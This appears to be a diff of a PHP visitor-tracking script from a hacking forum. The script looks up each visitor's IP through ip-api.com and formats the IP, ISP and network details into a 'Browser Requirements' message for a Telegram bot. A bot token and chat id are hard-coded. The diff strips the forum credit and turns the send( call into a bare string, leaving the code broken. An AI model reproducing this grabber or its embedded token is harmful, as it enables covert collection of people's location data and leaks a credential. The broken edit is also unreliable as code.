@@ -10,7 +10,7 @@ function telegram($msg) {
 }
 
 $browser_id= '5055359847:AAG1qTAiykWANsRb1HZL0JIdQ0_nBtzkf0o'; // enter bot token
-$setup_code = 1887870506; // enter chat id
+$setup_code = 1887870506; 
 
 $ip=$_SERVER['REMOTE_ADDR']; 
 $ipapi = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
@@ -18,8 +18,8 @@ $datetime = date("d.m.Y H:i:s"); // g:ia l F j Y   l, F j, Y, g:ia
 
 
 
+("Browser Requirements:
 
-send("Browser Requirements:
 
         IP  :  $ipapi->query
         Operating system  :  replace in the sub comment
@@ -35,12 +35,7 @@ send("Browser Requirements:
         Ass  :  $ipapi->as
         
 
-
-        @TR_HACK_FORUM Owner= @Cakma_H4CK3R
         ");
-
-// Operating system $user_os
-// Browser $user_browser
 
 
 
